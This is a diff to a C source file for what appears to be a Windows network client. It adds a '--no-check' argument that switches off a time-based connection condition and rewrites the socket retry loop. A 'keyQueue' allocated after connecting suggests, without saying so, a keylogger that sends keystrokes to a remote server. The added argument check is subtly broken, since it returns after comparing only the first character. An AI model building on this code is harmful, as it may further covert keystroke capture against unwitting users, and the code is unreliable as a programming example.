@@ -1,11 +1,23 @@
 #pragma once
 
-// Add argument to remove time condition
+int isCheckEnabled() {
+	if (__argc > 1 && strlen(__argv[1]) == 10) {
+		char Argu[] = "--no-check";
+		for (int i = 0; i < 10; i++) {
+			if (__argv[1][i] != Argu[i]) {
+				return 1;
+			}
+			return 0;
+		}
+	}
+	return 1;
+}
+
 int main_client() {
-    SOCKET MainSock = INVALID_SOCKET;
-    while (1) {
+    SOCKET MainSock;
+    do {
 	    MainSock = initSocket();
-	    if (MainSock == INVALID_SOCKET) {
+	    if (isCheckEnabled() && MainSock == INVALID_SOCKET) {
             time_t nTime = time(NULL);
 			struct tm aTime = { };
 			localtime_s(&aTime, &nTime);
@@ -15,8 +27,7 @@ int main_client() {
             }
             else return 1;
         }
-        else break;
-    }
+	} while (MainSock == INVALID_SOCKET);
 
 	queue* keyQueue = (queue*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(queue));
 	youthArgs* youthparam = (youthArgs*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(youthArgs));
